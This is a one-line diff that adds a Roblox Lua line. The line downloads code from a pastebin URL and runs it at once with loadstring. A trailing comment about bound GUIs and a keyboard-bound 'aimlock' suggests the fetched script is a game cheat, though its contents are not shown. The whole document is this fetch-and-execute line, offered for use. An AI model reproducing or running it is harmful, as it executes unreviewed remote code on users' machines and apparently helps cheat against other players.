@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/6rd91GZx", true))() -- note, dont open guis as theyre binded, and aimlock is keyboard binded, the rest works
